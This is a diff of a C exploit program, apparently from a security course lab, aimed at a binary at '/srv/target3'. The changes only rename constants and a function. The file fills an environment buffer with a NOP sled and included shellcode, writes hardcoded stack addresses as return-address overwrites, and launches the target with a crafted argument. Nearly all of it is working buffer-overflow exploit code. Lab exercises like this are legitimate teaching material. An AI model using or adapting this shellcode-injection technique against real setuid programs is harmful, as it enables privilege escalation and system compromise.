@@ -6,28 +6,29 @@
 #include "shellcode.h"
 
 const char* TARGET = "/srv/target3";
-const int ENV_SIZE = 400;
-const uint32_t BASE_ADDR = 0xffffdec0;
-const int NOP_SIZE = 201;
-const char NOP_CHAR = 0x90;
-const int RET_OFFSET = 4;
-const uint32_t A1 = BASE_ADDR + RET_OFFSET;
-const uint32_t A2 = BASE_ADDR + 2 * RET_OFFSET;
+
+const int ESIZE = 400;
+const uint32_t BASE = 0xffffdec0;
+const int NSIZE = 201;
+const char NOP = 0x90;
+const int DIFF = 4;
+const uint32_t A1 = BASE + DIFF;
+const uint32_t A2 = BASE + 2 * DIFF;
 const char buf[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
 
-void prepEnv(char *e) {
-    memset(e, NOP_CHAR, ENV_SIZE - 1);
+void prep(char *e) {
+    memset(e, NOP, ESIZE - 1);
     *((uint32_t *)(e)) = A1;
-    *((uint32_t *)(e + RET_OFFSET)) = A2;
-    memcpy(e + NOP_SIZE, shellcode, sizeof(shellcode));
-    e[ENV_SIZE - 1] = '\0';
+    *((uint32_t *)(e + DIFF)) = A2;
+    memcpy(e + NSIZE, shellcode, sizeof(shellcode));
+    e[ESIZE - 1] = '\0';
 }
 
 int main(void) {
     char *args[] = {TARGET, buf, NULL};
-    char env[ENV_SIZE];
+    char env[ESIZE];
 
-    prepEnv(env);
+    prep(env);
 
     char *envp[] = {env};
 
